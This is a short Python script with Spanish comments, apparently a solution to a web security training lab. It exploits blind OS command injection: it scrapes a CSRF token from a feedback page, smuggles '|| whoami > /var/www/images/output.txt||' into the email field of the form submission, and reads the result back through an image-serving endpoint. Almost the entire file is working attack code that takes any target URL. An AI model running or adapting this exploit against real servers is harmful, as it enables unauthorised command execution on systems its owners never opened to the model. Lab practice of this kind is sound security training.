import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
    """Obtine el token csrf de la página feedback"""
    try:
        path = '/feedback'
        r = s.get(f'{url}{path}', verify=False, proxies=proxies)
        soup = BeautifulSoup(r.text, 'html.parser')
        csrf_token = soup.find("input", {"name": "csrf"})['value']
        print(f"token: \n{csrf_token}")
        return csrf_token
    except Exception as e:
        print(f"[-] Error al obtener el csrf: {e}")
        return None
    

def exploit_command_injection(s, url):
    path = '/feedback/submit'
    command_injection = '|| whoami > /var/www/images/output.txt||'
    csrf_token = get_csrf_token(s, url)
    params = {
        'csrf': csrf_token,
        'name': 'lspci4',
        'email': f'lspci4%40lspci4.com{command_injection}',
        'subject': 'test',
        'message': 'test'
    }
    r = s.post(f'{url}{path}', data=params, verify=False, proxies=proxies)
    print(f"{r.text}")
    print(f"[+] Enviando el exploit {command_injection}...")
    
    ''' verificando command injection'''
    file_path = f'/image?filename=output.txt'
    request2 = s.get(f'{url}{file_path}', verify=False, proxies=proxies)
    if (request2.status_code == 200):
        print("Command injection successful!")
        print(f"Contenido del output.txt: /n{request2.text}")
    else:
        print("Failed command injection")
        
    
    

def main():
    if (len(sys.argv)!=2):
        print(f"[+] Uso: {sys.argv[0]} <url>")
        print(f"[+] Ejemplo: {sys.argv[0]} www.example.com")
        return
    
    url = sys.argv[1]
    print(f"[+] Explotando blind command injection en el campo email...")
    
    s = requests.session()
    exploit_command_injection(s, url)
    

if __name__ == "__main__":
    main()